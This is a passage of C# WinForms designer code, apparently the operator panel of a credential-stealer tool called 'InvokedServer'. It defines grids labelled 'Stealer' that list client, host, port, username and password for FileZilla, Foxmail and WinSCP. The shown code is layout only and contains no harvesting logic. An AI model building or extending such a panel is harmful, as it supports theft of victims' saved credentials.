            this.StealerFilezillaDataGridView.DefaultCellStyle = dataGridViewCellStyle51;
            this.StealerFilezillaDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerFilezillaDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerFilezillaDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerFilezillaDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerFilezillaDataGridView.Name = "StealerFilezillaDataGridView";
            this.StealerFilezillaDataGridView.ReadOnly = true;
            this.StealerFilezillaDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerFilezillaDataGridView.RowHeadersVisible = false;
            this.StealerFilezillaDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerFilezillaDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerFilezillaDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerFilezillaDataGridView.TabIndex = 6;
            this.StealerFilezillaDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFilezillaDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerFilezillaDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerFilezillaDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerFilezillaDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerFilezillaDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFilezillaDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerFilezillaDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerFilezillaDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerFilezillaDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerFilezillaDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerFilezillaDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerFilezillaDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerFilezillaDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerFilezillaDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn64
            // 
            this.dataGridViewTextBoxColumn64.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn64.HeaderText = "Client";
            this.dataGridViewTextBoxColumn64.Name = "dataGridViewTextBoxColumn64";
            this.dataGridViewTextBoxColumn64.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn65
            // 
            this.dataGridViewTextBoxColumn65.FillWeight = 20F;
            this.dataGridViewTextBoxColumn65.HeaderText = "Host";
            this.dataGridViewTextBoxColumn65.Name = "dataGridViewTextBoxColumn65";
            this.dataGridViewTextBoxColumn65.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn66
            // 
            this.dataGridViewTextBoxColumn66.FillWeight = 5F;
            this.dataGridViewTextBoxColumn66.HeaderText = "Port";
            this.dataGridViewTextBoxColumn66.Name = "dataGridViewTextBoxColumn66";
            this.dataGridViewTextBoxColumn66.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn67
            // 
            this.dataGridViewTextBoxColumn67.FillWeight = 12F;
            this.dataGridViewTextBoxColumn67.HeaderText = "Username";
            this.dataGridViewTextBoxColumn67.Name = "dataGridViewTextBoxColumn67";
            this.dataGridViewTextBoxColumn67.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn68
            // 
            this.dataGridViewTextBoxColumn68.FillWeight = 12F;
            this.dataGridViewTextBoxColumn68.HeaderText = "Password";
            this.dataGridViewTextBoxColumn68.Name = "dataGridViewTextBoxColumn68";
            this.dataGridViewTextBoxColumn68.ReadOnly = true;
            // 
            // FoxmailPage
            // 
            this.FoxmailPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.FoxmailPage.Controls.Add(this.StealerFoxmailDataGridView);
            this.FoxmailPage.ImageIndex = 16;
            this.FoxmailPage.Location = new System.Drawing.Point(139, 4);
            this.FoxmailPage.Name = "FoxmailPage";
            this.FoxmailPage.Size = new System.Drawing.Size(567, 207);
            this.FoxmailPage.TabIndex = 14;
            this.FoxmailPage.Text = "Foxmail";
            // 
            // StealerFoxmailDataGridView
            // 
            this.StealerFoxmailDataGridView.AllowUserToAddRows = false;
            this.StealerFoxmailDataGridView.AllowUserToDeleteRows = false;
            this.StealerFoxmailDataGridView.AllowUserToOrderColumns = true;
            this.StealerFoxmailDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle52.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle52.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle52.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle52.SelectionForeColor = System.Drawing.Color.White;
            this.StealerFoxmailDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle52;
            this.StealerFoxmailDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerFoxmailDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFoxmailDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle53.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle53.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle53.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle53.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle53.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle53.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle53.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerFoxmailDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle53;
            this.StealerFoxmailDataGridView.ColumnHeadersHeight = 20;
            this.StealerFoxmailDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn71,
            this.dataGridViewTextBoxColumn72,
            this.dataGridViewTextBoxColumn73,
            this.dataGridViewTextBoxColumn74});
            dataGridViewCellStyle54.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle54.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle54.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle54.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle54.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle54.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle54.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerFoxmailDataGridView.DefaultCellStyle = dataGridViewCellStyle54;
            this.StealerFoxmailDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerFoxmailDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerFoxmailDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerFoxmailDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerFoxmailDataGridView.Name = "StealerFoxmailDataGridView";
            this.StealerFoxmailDataGridView.ReadOnly = true;
            this.StealerFoxmailDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerFoxmailDataGridView.RowHeadersVisible = false;
            this.StealerFoxmailDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerFoxmailDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerFoxmailDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerFoxmailDataGridView.TabIndex = 6;
            this.StealerFoxmailDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFoxmailDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerFoxmailDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerFoxmailDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerFoxmailDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerFoxmailDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFoxmailDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerFoxmailDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerFoxmailDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerFoxmailDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerFoxmailDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerFoxmailDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerFoxmailDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerFoxmailDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerFoxmailDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn71
            // 
            this.dataGridViewTextBoxColumn71.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn71.HeaderText = "Client";
            this.dataGridViewTextBoxColumn71.Name = "dataGridViewTextBoxColumn71";
            this.dataGridViewTextBoxColumn71.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn72
            // 
            this.dataGridViewTextBoxColumn72.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn72.HeaderText = "Account";
            this.dataGridViewTextBoxColumn72.Name = "dataGridViewTextBoxColumn72";
            this.dataGridViewTextBoxColumn72.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn73
            // 
            this.dataGridViewTextBoxColumn73.FillWeight = 11F;
            this.dataGridViewTextBoxColumn73.HeaderText = "Password";
            this.dataGridViewTextBoxColumn73.Name = "dataGridViewTextBoxColumn73";
            this.dataGridViewTextBoxColumn73.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn74
            // 
            this.dataGridViewTextBoxColumn74.FillWeight = 6F;
            this.dataGridViewTextBoxColumn74.HeaderText = "Pop3";
            this.dataGridViewTextBoxColumn74.Name = "dataGridViewTextBoxColumn74";
            this.dataGridViewTextBoxColumn74.ReadOnly = true;
            // 
            // WinscpPage
            // 
            this.WinscpPage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.WinscpPage.Controls.Add(this.StealerWinscpDataGridView);
            this.WinscpPage.ImageIndex = 21;
            this.WinscpPage.Location = new System.Drawing.Point(139, 4);
            this.WinscpPage.Name = "WinscpPage";
            this.WinscpPage.Size = new System.Drawing.Size(567, 207);
            this.WinscpPage.TabIndex = 15;
            this.WinscpPage.Text = "Win SCP";
            // 
            // StealerWinscpDataGridView
            // 
            this.StealerWinscpDataGridView.AllowUserToAddRows = false;
            this.StealerWinscpDataGridView.AllowUserToDeleteRows = false;
            this.StealerWinscpDataGridView.AllowUserToOrderColumns = true;
            this.StealerWinscpDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle55.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle55.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle55.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle55.SelectionForeColor = System.Drawing.Color.White;
            this.StealerWinscpDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle55;
            this.StealerWinscpDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerWinscpDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerWinscpDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle56.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle56.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle56.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle56.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle56.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle56.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle56.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerWinscpDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle56;
            this.StealerWinscpDataGridView.ColumnHeadersHeight = 20;
            this.StealerWinscpDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn78,
            this.dataGridViewTextBoxColumn79,
            this.dataGridViewTextBoxColumn80,
            this.dataGridViewTextBoxColumn81,
            this.dataGridViewTextBoxColumn82});
            dataGridViewCellStyle57.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle57.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle57.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle57.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle57.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle57.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle57.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerWinscpDataGridView.DefaultCellStyle = dataGridViewCellStyle57;
            this.StealerWinscpDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerWinscpDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerWinscpDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerWinscpDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerWinscpDataGridView.Name = "StealerWinscpDataGridView";
            this.StealerWinscpDataGridView.ReadOnly = true;
            this.StealerWinscpDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerWinscpDataGridView.RowHeadersVisible = false;
            this.StealerWinscpDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerWinscpDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerWinscpDataGridView.Size = new System.Drawing.Size(567, 207);
            this.StealerWinscpDataGridView.TabIndex = 6;
            this.StealerWinscpDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerWinscpDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerWinscpDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerWinscpDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerWinscpDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerWinscpDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerWinscpDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerWinscpDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerWinscpDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerWinscpDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerWinscpDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerWinscpDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerWinscpDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerWinscpDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerWinscpDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn78
            // 
            this.dataGridViewTextBoxColumn78.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn78.HeaderText = "Client";
            this.dataGridViewTextBoxColumn78.Name = "dataGridViewTextBoxColumn78";
            this.dataGridViewTextBoxColumn78.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn79
            // 
            this.dataGridViewTextBoxColumn79.FillWeight = 20F;
            this.dataGridViewTextBoxColumn79.HeaderText = "Hostname";
            this.dataGridViewTextBoxColumn79.Name = "dataGridViewTextBoxColumn79";
            this.dataGridViewTextBoxColumn79.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn80
            // 
            this.dataGridViewTextBoxColumn80.FillWeight = 7F;
            this.dataGridViewTextBoxColumn80.HeaderText = "Port";
            this.dataGridViewTextBoxColumn80.Name = "dataGridViewTextBoxColumn80";
            this.dataGridViewTextBoxColumn80.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn81
            // 
            this.dataGridViewTextBoxColumn81.FillWeight = 15F;
            this.dataGridViewTextBoxColumn81.HeaderText = "Username";
            this.dataGridViewTextBoxColumn81.Name = "dataGridViewTextBoxColumn81";
            this.dataGridViewTextBoxColumn81.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn82
            // 
            this.dataGridViewTextBoxColumn82.FillWeight = 15F;
            this.dataGridViewTextBoxColumn82.HeaderText = "Password";
            this.dataGridViewTextBoxColumn82.Name = "dataGridViewTextBoxColumn82";
            this.dataGridViewTextBoxColumn82.ReadOnly = true;
            // 
            // MainKryptonPalette
            // 
            this.MainKryptonPalette.BasePaletteMode = ComponentFactory.Krypton.Toolkit.PaletteMode.SparklePurple;
            this.MainKryptonPalette.ContextMenu.StateCommon.ItemTextStandard.LongText.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.MainKryptonPalette.ContextMenu.StateCommon.ItemTextStandard.Padding = new System.Windows.Forms.Padding(0);
            this.MainKryptonPalette.FormStyles.FormMain.StateCommon.Back.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.MainKryptonPalette.FormStyles.FormMain.StateCommon.Border.DrawBorders = ((ComponentFactory.Krypton.Toolkit.PaletteDrawBorders)((((ComponentFactory.Krypton.Toolkit.PaletteDrawBorders.Top | ComponentFactory.Krypton.Toolkit.PaletteDrawBorders.Bottom) 
            | ComponentFactory.Krypton.Toolkit.PaletteDrawBorders.Left) 
            | ComponentFactory.Krypton.Toolkit.PaletteDrawBorders.Right)));
            this.MainKryptonPalette.FormStyles.FormMain.StateCommon.Border.Rounding = 12;
            this.MainKryptonPalette.HeaderStyles.HeaderCommon.StateCommon.Back.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.MainKryptonPalette.PanelStyles.PanelCommon.StateCommon.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.MainKryptonPalette.PanelStyles.PanelCommon.StateCommon.Color2 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.MainKryptonPalette.PanelStyles.PanelCommon.StateCommon.ColorStyle = ComponentFactory.Krypton.Toolkit.PaletteColorStyle.Solid;
            this.MainKryptonPalette.PanelStyles.PanelCommon.StateCommon.GraphicsHint = ComponentFactory.Krypton.Toolkit.PaletteGraphicsHint.None;
            this.MainKryptonPalette.TabStyles.TabCommon.StateCommon.Back.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.MainKryptonPalette.TabStyles.TabCommon.StateCommon.Back.Color2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(42)))), ((int)(((byte)(60)))));
            this.MainKryptonPalette.TabStyles.TabCommon.StateCommon.Back.ColorStyle = ComponentFactory.Krypton.Toolkit.PaletteColorStyle.Dashed;
            this.MainKryptonPalette.TabStyles.TabCommon.StateCommon.Content.Image.Effect = ComponentFactory.Krypton.Toolkit.PaletteImageEffect.Normal;
            this.MainKryptonPalette.TabStyles.TabCommon.StateCommon.Content.ShortText.Color1 = System.Drawing.Color.White;
            // 
            // guna2GradientPanel1
            // 
            this.guna2GradientPanel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel1.Controls.Add(this.guna2GradientPanel2);
            this.guna2GradientPanel1.Controls.Add(this.guna2GradientPanel3);
            this.guna2GradientPanel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2GradientPanel1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel1.Location = new System.Drawing.Point(0, 0);
            this.guna2GradientPanel1.Name = "guna2GradientPanel1";
            this.guna2GradientPanel1.Size = new System.Drawing.Size(879, 16);
            this.guna2GradientPanel1.TabIndex = 12;
            // 
            // guna2GradientPanel2
            // 
            this.guna2GradientPanel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel2.Controls.Add(this.StealerSearchClear);
            this.guna2GradientPanel2.Controls.Add(this.StealerSearchTextbox);
            this.guna2GradientPanel2.Controls.Add(this.StealerSearchbarLabel);
            this.guna2GradientPanel2.Controls.Add(this.StealerSearchBtn);
            this.guna2GradientPanel2.Dock = System.Windows.Forms.DockStyle.Left;
            this.guna2GradientPanel2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel2.Location = new System.Drawing.Point(0, 0);
            this.guna2GradientPanel2.Name = "guna2GradientPanel2";
            this.guna2GradientPanel2.Size = new System.Drawing.Size(229, 16);
            this.guna2GradientPanel2.TabIndex = 11;
            // 
            // StealerSearchClear
            // 
            this.StealerSearchClear.BackColor = System.Drawing.Color.Transparent;
            this.StealerSearchClear.BackgroundImage = global::InvokedServer.Properties.Resources.cross;
            this.StealerSearchClear.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerSearchClear.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerSearchClear.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerSearchClear.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerSearchClear.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerSearchClear.Dock = System.Windows.Forms.DockStyle.Right;
            this.StealerSearchClear.FillColor = System.Drawing.Color.Transparent;
